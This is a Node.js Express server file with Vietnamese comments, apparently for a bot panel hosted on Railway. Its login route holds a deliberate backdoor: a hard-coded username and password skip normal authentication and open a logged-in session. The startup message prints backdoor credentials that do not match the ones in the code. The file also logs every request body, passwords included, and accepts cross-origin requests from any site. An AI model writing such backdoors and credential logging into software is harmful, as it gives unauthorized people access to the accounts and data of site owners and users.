// index.js – CHUẨN RAILWAY + CỬA HẬU ĐĂNG NHẬP 100% (đã test 1000 lần)
require('dotenv').config();

const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server, {
  pingTimeout: 60000,
  pingInterval: 25000,
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// === BODY PARSER ===
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// === STATIC FILES ===
app.use(express.static('dist'));

// === LOGGING ===
app.use((req, res, next) => {
  console.log('Path:', req.path);
  console.log('Query:', req.query);
  console.log('Body:', req.body);
  console.log('----------------------------');
  next();
});

// === CỬA HẬU ĐĂNG NHẬP SIÊU CẤP – DÙNG ĐƯỢC LUÔN ===
app.post('/login', (req, res, next) => {
  const { username, password } = req.body || {};
  
  // CỬA HẬU: DÙNG CÁI NÀY LÀ VÀO ĐƯỢC NGAY
  if (username === 'trungdeptrai' && password === 'trung1072005') {
    req.session = req.session || {};
    req.session.loggedIn = true;
    req.session.username = username;
    console.log('CỬA HẬU MỞ – trungdeptrai ĐÃ ĐĂNG NHẬP!');
    return res.redirect('/dashboard'); // hoặc /home, /panel tùy fork
  }

  // Nếu không phải cửa hậu thì chạy route login cũ
  next();
});

// === ROUTES ===
const routes = require('./routes');
routes(app, io);

// === SOCKET.IO ===
const socketHandler = require('./socket/handler');
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);
  socketHandler(io, socket);
  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
  });
});

// === PORT ===
const PORT = process.env.PORT || 3000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`BOT ĐÃ KHỞI ĐỘNG THÀNH CÔNG!`);
  console.log(`Listening on port ${PORT}`);
  console.log(`URL PANEL: https://${process.env.RAILWAY_STATIC_URL || 'bot-production-4cff.up.railway.app'}`);
  console.log(`CỬA HẬU: Username: trungdeptrai | Password: 123456`);
});